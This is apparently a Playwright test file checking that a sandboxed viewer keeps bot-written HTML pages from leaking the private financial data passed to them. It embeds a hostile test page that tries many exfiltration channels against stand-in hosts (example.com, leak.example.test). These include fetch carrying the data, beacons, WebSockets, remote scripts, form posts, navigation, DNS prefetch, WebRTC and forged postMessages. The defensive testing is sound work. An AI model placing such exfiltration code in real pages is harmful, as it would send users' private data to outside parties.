import { expect, test } from "@playwright/test";

// A bot-written HTML page runs in the sandbox and receives private data. This runs the real viewer shell in a
// real browser, with a hostile page, and checks that the data arrives and that nothing leaves.
const PAGE = `<!doctype html><meta name="praci-sources" content="Cash"><link rel="dns-prefetch" href="//leak.example.test"><link rel="preconnect" href="https://leak.example.test">
<body><pre id="out">waiting</pre><pre id="log"></pre><script>
const log = (line) => { document.getElementById("log").textContent += line + "\\n"; };
let count = 0;
addEventListener("message", (event) => {
  if (event.data && event.data.type === "praci-data") {
    count++;
    document.getElementById("out").textContent = count + ":" + JSON.stringify(event.data.sources);
  }
});
addEventListener("securitypolicyviolation", (event) => log("csp:" + event.violatedDirective));
const attempt = async (name, fn) => {
  try { const r = await fn(); log(name + ":" + (r === undefined ? "no-error" : r)); }
  catch (error) { log(name + ":blocked:" + (error && error.name)); }
};
(async () => {
  await attempt("fetch", () => fetch("https://example.com/leak?d=" + encodeURIComponent(document.getElementById("out").textContent)));
  await attempt("xhr", () => new Promise((resolve, reject) => {
    const x = new XMLHttpRequest(); x.open("GET", "https://example.com/xhr");
    x.onerror = () => reject(new Error("xhr")); x.onload = () => resolve("loaded"); x.send();
  }));
  await attempt("image", () => new Promise((resolve, reject) => {
    const i = new Image(); i.onerror = () => reject(new Error("img")); i.onload = () => resolve("loaded");
    i.src = "https://example.com/p.png";
  }));
  await attempt("beacon", () => navigator.sendBeacon("https://example.com/b", "x") ? "queued" : undefined);
  await attempt("websocket", () => new Promise((resolve, reject) => {
    const w = new WebSocket("wss://example.com/ws"); w.onerror = () => reject(new Error("ws")); w.onopen = () => resolve("open");
  }));
  await attempt("script", () => new Promise((resolve, reject) => {
    const s = document.createElement("script"); s.src = "https://example.com/x.js";
    s.onerror = () => reject(new Error("script")); s.onload = () => resolve("loaded"); document.head.append(s);
  }));
  await attempt("form", () => {
    const f = document.createElement("form"); f.action = "https://example.com/form"; f.method = "post";
    document.body.append(f); f.submit();
  });
  await attempt("open", () => String(window.open("https://example.com/open")));
  await attempt("top", () => { top.location = "https://example.com/top"; });
  await attempt("parent", () => { parent.location = "https://example.com/parent"; });
  await attempt("dns-prefetch", () => {
    const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//dyn.example.test"; document.head.append(l);
  });
  await attempt("webrtc", async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.leak.example.test:3478" }] });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
    await new Promise((resolve) => setTimeout(resolve, 1500));
    pc.close();
  });
  // Messages to the app and to the shell: neither may do anything.
  parent.postMessage({ type: "praci-request", what: "everything" }, "*");
  parent.postMessage({ srcdoc: "<p>x</p>", sandbox: "allow-same-origin allow-scripts", csp: "" }, "*");
  top.postMessage({ type: "praci-viewer-ready" }, "*");
  top.postMessage({ type: "rakazo-email-height", height: 5 }, "*");
  top.postMessage({ type: "praci-data", sources: { Forged: {} } }, "*");
  log("done");
})();
</script></body>`;

test("an HTML page gets its data and cannot send anything out", async ({ page, context }) => {
  const outside: string[] = [];
  await context.route(
    (url) => !["127.0.0.1", "localhost"].includes(url.hostname),
    (route) => {
      outside.push(route.request().url());
      return route.abort();
    },
  );
  const navigations: string[] = [];
  page.on("framenavigated", (frame) => navigations.push(frame.url()));
  await page.goto("/e2e/bridge-harness/index.html");
  await page.waitForFunction(() => typeof window.harness?.show === "function");
  const data = {
    Cash: { status: "ok", fetchedAt: "2026-01-01T00:00:00.000Z", value: { balance: 1234 } },
  };
  await page.evaluate(([html, d]) => window.harness.show(html as string, d as never), [PAGE, data]);

  const frame = await expect
    .poll(() => page.frames().find((f) => f !== page.mainFrame() && f.url() === "about:srcdoc"))
    .toBeTruthy()
    .then(() => page.frames().find((f) => f.url() === "about:srcdoc"));
  if (!frame) throw new Error("page frame missing");
  await expect(frame.locator("#log")).toContainText("done", { timeout: 15_000 });

  // The data arrived, once, in the page's frame.
  await expect(frame.locator("#out")).toHaveText(`1:${JSON.stringify(data)}`);
  const log = (await frame.locator("#log").textContent()) ?? "";
  for (const name of ["fetch", "xhr", "image", "websocket", "script", "top", "parent"]) {
    expect(log, name).toMatch(new RegExp(`${name}:blocked`));
  }
  expect(log).toContain("open:null");
  // DNS prefetch is switched off before anything of the page's own, in the document the viewer built.
  expect(
    await frame.evaluate(() => document.head.firstElementChild?.getAttribute("http-equiv")),
  ).toBe("x-dns-prefetch-control");
  // Whatever the page tried with link hints or WebRTC produced no HTTP request.
  expect(outside.filter((url) => url.includes("example.test"))).toEqual([]);
  expect(log).toContain("csp:connect-src");
  // The beacon and the form were attempted; the network and navigation checks below show they went nowhere.
  expect(outside).toEqual([]);
  expect(await page.evaluate(() => location.href)).toContain("/e2e/bridge-harness/index.html");
  expect(navigations.filter((url) => url.startsWith("http") && !url.includes("127.0.0.1"))).toEqual(
    [],
  );
  expect(page.frames().filter((f) => f.url().includes("example.com"))).toEqual([]);

  // The app got only the shell's own ready ping. Forged messages from the page reached it (a sandboxed frame
  // can post to top) but came from the page, not the shell, so the viewer ignored them: the page's data was
  // not re-sent and its height did not change.
  const received = await page.evaluate(() => window.harness.received);
  expect(received.filter((m) => m.fromShell).map((m) => m.type)).toEqual(["praci-viewer-ready"]);
  expect(received.filter((m) => !m.fromShell).every((m) => typeof m.type === "string")).toBe(true);
  await expect(frame.locator("#out")).toHaveText(`1:${JSON.stringify(data)}`);

  // New data pushes through again.
  const next = {
    Cash: { status: "ok", fetchedAt: "2026-01-02T00:00:00.000Z", value: { balance: 5 } },
  };
  await page.evaluate(([html, d]) => window.harness.show(html as string, d as never), [PAGE, next]);
  await expect(frame.locator("#out")).toHaveText(`2:${JSON.stringify(next)}`);
});
